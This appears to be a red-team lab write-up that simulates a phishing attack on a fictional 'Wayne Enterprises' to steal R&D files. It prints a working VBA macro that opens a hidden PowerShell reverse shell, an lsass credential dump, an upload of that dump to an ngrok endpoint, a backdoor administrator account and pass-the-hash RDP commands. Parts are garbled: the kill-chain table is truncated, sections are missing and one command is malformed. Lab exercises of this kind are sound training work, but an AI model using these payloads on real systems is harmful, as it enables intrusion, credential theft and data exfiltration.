# ‚ò†Ô∏è Phase 2: Attack Simulation & Threat Emulation

> ‚ö†Ô∏è **Disclaimer**  
> This lab was executed in a fully isolated, non-production environment owned and controlled by me. The techniques demonstrated are strictly for educational purposes. Do **not** replicate these attacks on any system you do not explicitly own or have written authorization to test.

---

## üß† Objective

Simulate a targeted attack against **Wayne Enterprises** to confirm the presence of an **R&D department** and exfiltrate sensitive data. Based on OSINT, the existence of such a department was hypothesized but unconfirmed.  
The attack chain follows these goals:

- Gain initial access  
- Establish persistence  
- Escalate privileges  
- Move laterally  
- Exfiltrate confidential files

| 3. Delivery       | Payload sent via phishing              |
| 4. Exploitation   | Gaining access and dumping credentials |
| 5. Installation   | Creating persistence on host           |
| 6. C2             | Maintaining access, exfiltration       |
| 7. Objectives     | Lateral movement, data theft           |

## üîç 1. Reconnaissance

External scan:

```bash
sudo nmap -Pn -sS -sV -T4 -p 3389,80,22,445,5985 172.203.221.2
```

**Open ports discovered:**
- 3389 (RDP)
- 5985 (WinRM)

**OSINT Results:**
- CEO: Bruce Wayne
- HR Head: Barbara Gordon (found via fake LinkedIn profile)
- Email: `barbaragordonhr1@gmail.com`

Planned infiltration via Barbara's workstation.

## üß™ 2. Weaponization

Initial brute-force attempts on RDP failed. Switched to phishing.

**Payload:** Malicious `.docm` disguised as HR document with embedded PowerShell reverse shell.

**VBA Macro Payload:**

```vba
Sub AutoOpen()
    Shell "powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('192.168.1.196',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(Invoke-Expression $d 2>&1 | Out-String );$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r),0,$r.Length)}\"", vbHide
End Sub
```

**Setup Commands:**
```bash
python3 upload_server.py
ngrok http 80
nc -lvnp 4444
```

## üì¶ 3. Delivery

- Sent `.docm` to Barbara via phishing email
- Victim opened file, macro executed
- Reverse shell triggered to attacker (Joker VM)

## üí• 4. Exploitation

**Credential Dump:**
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
```

**Exfiltration:**
```powershell
Invoke-WebRequest -Uri "http://<ngrok_url>/upload" -Method POST -InFile C:\Temp\lsass.dmp
```

**Hash Extraction:**
```bash
pypykatz lsa minidump lsass.dmp
```

```cmd
net user Joker Pass123 /add
group localgroup administrators Joker /add
```

**Scheduled Task Backdoor:**

## üõ†Ô∏è 6. Command & Control (C2)

We will utilize the extracted DMP file to RDP via pass-the-hash onto the target machine and move laterally to R&D from there.

We have established persistance with a reverse powershell and scheduled task to reconnect the reverse shell on startup, this will ensure that we maintain connectivity to the target at all times.

## ‚ú® 7. Actions on Objectives

**Pass-the-Hash RDP:**
```bash
xfreerdp /u:Barbara.HR /d:WAYNE /pth:<NTLM_HASH> /v:172.203.221.2
```

**Post-RDP Enumeration:**
```cmd
net user /domain
```

- Identified `Lucious.R&D`
- Accessed his profile and files
- Found and exfiltrated `Batmobile-Schematics.bmp`
